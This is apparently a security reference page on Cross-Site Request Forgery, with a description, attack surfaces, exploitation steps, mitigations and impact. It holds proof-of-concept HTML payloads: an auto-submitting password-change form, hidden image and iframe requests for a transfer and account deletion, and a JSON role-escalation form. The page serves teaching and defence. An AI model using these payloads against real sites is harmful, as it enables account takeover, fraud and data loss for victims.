📌 Cross-Site Request Forgery (CSRF)

🧠 Description

What is CSRF?

Cross-Site Request Forgery is an attack that forces an authenticated user to perform unintended actions on a web application. The attacker tricks the victim into clicking a malicious link or visiting a crafted page.

🎯 Attack Surface

  • ✅ State-changing requests (POST, PUT, DELETE)
  • ✅ Password/email change forms
  • ✅ Money transfer endpoints
  • ✅ Admin action endpoints

💣 CSRF Proof of Concept

<html>
<body>
<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="password" value="hacked" />
  <input type="submit" value="Click me" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
📧 Hidden Image/Iframe CSRF
<img src="https://target.com/transfer?amount=1000&to=attacker" style="display:none" />
<iframe src="https://target.com/delete-account" style="display:none"></iframe>
📡 JSON CSRF (If Content-Type is lax)
<form action="https://target.com/api/user" method="POST" enctype="text/plain">
<input name='{"role":"admin"}' value='' type='hidden' />
</form>

⚙️ Exploitation Steps

  1. Identify state-changing request (no CSRF token)
  2. Create HTML form replicating the request
  3. Host on attacker-controlled domain
  4. Trick victim into visiting the page

🛡️ Mitigation

✅ CSRF Tokens: Unique, unpredictable tokens per session/request
✅ SameSite Cookies: Set SameSite=Lax or SameSite=Strict
✅ Custom Headers: Require custom headers (e.g., X-Requested-With)
✅ Re-authentication: Require password for critical actions
✅ CAPTCHA: For sensitive operations

⚠️ Risk / Impact

Severity: Medium

Impact: Account takeover, password change, money transfer, data deletion
